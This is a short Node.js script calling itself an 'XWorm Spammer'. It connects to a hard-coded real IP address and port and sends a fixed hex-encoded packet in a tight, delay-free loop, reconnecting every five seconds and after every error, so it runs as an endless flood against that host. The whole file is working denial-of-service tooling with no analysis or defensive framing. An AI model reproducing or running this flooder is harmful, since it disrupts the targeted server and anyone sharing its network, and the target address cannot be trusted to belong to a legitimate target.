const net = require('net');

const Host = '185.84.160.176';
const Port = 7000;

// XWorm Spammer Made With Heart By 412
//dadefdfd3df5ba731438e7569f826962 for <123456789>
//faa1b431d0e537b6b12ececb222b60d6 for own
const connect = '323536001f62c31be197e3b774ce71c1d14a103af7d0cd4db722ed82291457945c7f327583f62b6a2c4b2183747786b8bcdb89a869cb7bbad77d662fd5c809aea8e3cdaca4151274df66cfce1e35d39afaab0cfd724c4ffb0e5debd327786897af3be8a8c1d9b81c464dcf370d19fe155ce110de6431fa29f075bf0ca60c140d4f3f8a452276a9f73e90a4f95990e9e38184b06678c793b3b228b9d7f6d9b1676ac6815136248a1d5bf20d2b67748d3ec5972cdc11df546a1a3e4e2371966375092f8ce70d5c05d224e6a06357f7a3ccbeeffb8372104e49094611e6d411d122442162cd1b34191f0699bd1c26cc87e47a63be8a4dee7b863e0ce08a3a9d71071881b431';
// const connect = '323536006a8f2256683dedf88051e5df2924e0822c6af3c2831ae86d0f6699588464855e9750a02723bd2678196bb4c037f25d5afb7442356483a1a8a8653fcc9902d6e631c22f889a230003fdf6135c0645b5e7206baf90981928ece48e11ee3e6840a6f47ae4c3f145f68e1c464e21fe2652ed510455d692ea2069a0c7508fb38a6ddfb898ef25b835590b87a7cc00c258f0a5878b0f746a3c94aae13b1f9b81e8703f731b9d6e2fc106dbd0b6478846f6578a05bd90fd355207048f8b748ffc9a8d0ddc325d393bc723a6de425965adbf0416900c499f3989f15d4b5eb596cc8383f83c35f5fc7502583702bf3aaead2af5b018c1fc2f6caa85f872605d64978f6175'
const Buffer1 = Buffer.from(connect, 'hex');


const client = new net.Socket();
function connectAndSend() {

client.connect(Port, Host, () => {
    console.log('Connected to the server');

    const endTime = Date.now() + 5000; // รอ 5 วิแล้ว close connection แล้ว reconnect

    function sendPackets() {
        if (Date.now() >= endTime) {
            console.log('Disconnecting...');
            client.destroy(); 
            setTimeout(connectAndSend, 10);
            return;
        }

        client.write(Buffer1);


        setImmediate(sendPackets); // Repeat without delay
    }

    sendPackets();
});

client.on('error', (err) => {
    console.error('Error:', err);
    client.destroy(); // Ensure the socket is closed on error
    setTimeout(connectAndSend, 10); // Wait and retry connection on error
});
}

// Start the connection and sending process
connectAndSend();
